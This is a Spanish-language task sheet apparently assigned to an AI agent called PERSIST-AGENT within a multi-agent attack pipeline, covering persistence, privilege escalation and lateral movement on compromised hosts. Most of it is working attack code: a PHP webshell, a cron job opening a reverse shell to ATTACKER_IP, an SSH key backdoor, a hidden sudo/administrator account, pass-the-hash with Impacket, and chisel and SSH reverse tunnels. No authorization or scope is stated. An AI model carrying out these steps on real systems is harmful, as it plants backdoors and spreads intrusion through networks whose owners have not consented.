# Tareas Específicas: PERSIST-AGENT

## Objetivo Principal

Establecer persistencia en sistemas comprometidos, escalar privilegios y
realizar movimiento lateral dentro de la red objetivo.

---

## Tareas Asignadas

### Fase 4A: Persistencia

#### 1.1 Webshell Persistente
**Objetivo**: Mantener acceso web incluso si se pierde la shell.

```php
<?php
// webshell.php - Upload to web root
if(isset($_REQUEST['cmd'])){
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
}
?>
```

**Ubicaciones comunes**:
- `/var/www/html/`
- `C:\inetpub\wwwroot\`
- Directorios de uploads

#### 1.2 Cron Job / Scheduled Task
**Objetivo**: Ejecución periódica de payloads.

```bash
# Linux - cada 5 minutos
echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" | crontab -
```

```powershell
# Windows - cada hora
schtasks /create /tn "Updater" /tr "powershell -c reverse-shell.ps1" /sc hourly
```

#### 1.3 SSH Key Backdoor
**Objetivo**: Acceso SSH persistente.

```bash
mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo "PUBLIC_KEY_HERE" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

#### 1.4 Usuario Oculto
**Objetivo**: Cuenta de administración oculta.

```bash
# Linux
useradd -m -s /bin/bash secretadmin
usermod -aG sudo secretadmin
echo "secretadmin:Password123!" | chpasswd

# Windows (via PowerShell, si está disponible)
net user secretadmin Password123! /add
net localgroup Administrators secretadmin /add
```

---

### Fase 4B: Escalada de Privilegios

#### 2.1 Linux Privesc
**Objetivo**: Obtener acceso root.

**Verificaciones**:
```bash
sudo -l                                          # Comandos sudo permitidos
find / -perm -4000 2>/dev/null                   # SUID binaries
cat /etc/crontab                                  # Tareas programadas
ls -la /etc/shadow                                # Acceso a hashes
uname -a                                          # Kernel version (kernel exploits)
```

#### 2.2 Windows Privesc
**Objetivo**: Obtener acceso Administrador/System.

**Herramientas**: PowerUp, WinPEAS, Seatbelt

**Verificaciones**:
- AlwaysInstallElevated registry key
- Service permissions
- Unquoted service paths
- Token privileges (SeImpersonatePrivilege, SeDebugPrivilege)

#### 2.3 Container Escape (si aplica)
**Objetivo**: Escapar de contenedor Docker/LXC al host.

**Verificaciones**:
```bash
cat /proc/1/cgroup | grep -i docker              # ¿Estamos en contenedor?
capsh --print                                     # Capabilities disponibles
ls -la /var/run/docker.sock                       # Docker socket montado?
```

---

### Fase 4C: Movimiento Lateral

#### 3.1 Pass-the-Hash (Windows)
**Objetivo**: Autenticarse en otros sistemas usando hashes NTLM.

```bash
# Usando Impacket (si disponible)
psexec.py DOMAIN/Administrator@TARGET_IP -hashes LMHASH:NTHASH
wmiexec.py DOMAIN/Administrator@TARGET_IP -hashes LMHASH:NTHASH
```

#### 3.2 SSH Pivoting
**Objetivo**: Usar sistema comprometido como jump box.

```bash
# Forward local port
ssh -L 8080:internal-server:80 user@pivot-host

# Reverse tunnel (desde sistema comprometido)
ssh -R 8080:localhost:80 attacker-ip
```

#### 3.3 Port Forwarding
**Objetivo**: Acceder a servicios internos no accesibles directamente.

```bash
# Con chisel (si está disponible)
# Servidor (atacante)
./chisel server -p 8000 --reverse

# Cliente (objetivo comprometido)
./chisel client ATTACKER_IP:8000 R:3306:localhost:3306
```

---

## Checklist de Entregable

- [ ] Webshell persistente instalada
- [ ] Cron job / Scheduled task creado
- [ ] SSH key backdoor configurado (si aplica)
- [ ] Escalada de privilegios intentada
- [ ] Movimiento lateral realizado
- [ ] Documentación de rutas de acceso
- [ ] Artefactos de persistencia documentados para limpieza

---

## Coordinación con Otros Agentes

- **EXPLOIT-AGENT**: Recibe acceso inicial
- **CLEANUP-AGENT**: Provee lista de artefactos creados para limpieza

---

*Última actualización: Junio 2026*
